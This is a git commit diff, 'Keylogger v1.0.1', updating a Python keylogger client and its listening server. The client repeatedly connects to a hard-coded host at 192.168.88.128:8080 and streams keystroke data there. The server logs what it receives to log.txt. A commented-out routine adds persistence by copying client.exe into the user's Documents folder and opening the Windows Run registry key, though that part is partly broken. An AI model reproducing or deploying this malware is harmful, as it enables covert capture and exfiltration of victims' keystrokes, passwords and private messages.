f40b3c9848dd6c7f3c3c1cabd54991061736539c
zevran <zevran@kali.casakali.com>
2020-05-25 18:14:54 -0700

    Keylogger v1.0.1

--- keylogger/keyLoggerClient.py
+++ keylogger/keyLoggerClient.py
@@ -1,13 +1,32 @@
-#!/usr/bin/python
-
-
 import socket
 import os
+import subprocess
+import time
+import shutil
+import random
 
+"""
+def persistance():
+	path = os.getcwd().strip('/n')
+	Null, userprof = subprocess.check_output('set USERPROFILE', shell=True,stdin=subprocess.PIPE,  stderr=subprocess.PIPE).decode().split('=')
+	
+	destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'
+	
+#First time
+	if not os.path.exists(destination):
+		if not os.path.exists(path):
+			os.mkdir(path)
+		shutil.copyfile(path+'\client.exe', destination)
+		key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
+		wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS
+		key.Close()
+"""		
 def connecting():
 	s = socket.socket()
-	s.connect("192.168.88.128", 8080)
-
+	print("Trying to connect")
+	s.connect(("192.168.88.128", 8080))
+	print("Connected")
+	
 	while True:
 		try:
 			print("Starting Keylog...")
@@ -21,5 +40,11 @@ def connecting():
 			break
 
 def main():
-	connecting()
+#	persistance()
+	while True:
+		try:
+			connecting()
+		except:
+			sleep_for = random.randrange(1,10) #Sleep
+			time.sleep(int(sleep_for))
 main()
--- keylogger/keyLoggerServer.py
+++ keylogger/keyLoggerServer.py
@@ -3,38 +3,42 @@
 import socket
 import os
 
+HOST_NAME = "192.168.88.128"
+PORT_NUMBER = 8080
+PATH = "/home/zevran/Documents/keylog"
+
 def createFolders():
-	path = "/home/zevran/Documents/keylog"
-	if(not(os.path.exists(path))):
-		os.mkdir(path)
-	os.chdir(path)
-	return path
+	if(not(os.path.exists(PATH))):
+		os.mkdir(PATH)
+	os.chdir(PATH)
 
-def createFile(path):
-	if(not(os.path.exists(path+"log.txt"))):
-		f = open("log.txt","a+")
-		f.close()
-
-def connecting(path):
+def connecting():
 	try:
 		s = socket.socket()		
-		s.bind(("192.168.88.128",8080))	
+		s.bind((HOST_NAME,PORT_NUMBER))	
 		print('Listening...')
 		s.listen(1)			
 		conn , addr = s.accept()	
 		print('[+] We got a conection from ', addr)
-		
 		f = open("log.txt","a+")
+		i = 0
+
 		while True:				
 			recvData = conn.recv(1024).decode('utf-8', errors="replace")
-			print(recvData)
+			i = i + 1
 			f.write(recvData + "\n")
+			if i == 10:
+				f.close
+				f = open("log.txt","a+")
+				i = 0
+
 	except KeyboardInterrupt:
 		print('[!] Server is terminated')
-		conn.close()
+		return 1
 
 def main():
-	path = createFolders()
-	createFile(path)
-	connecting(path)
+	createFolders()
+	while True:
+		if connecting() == 1:
+			break
 main()
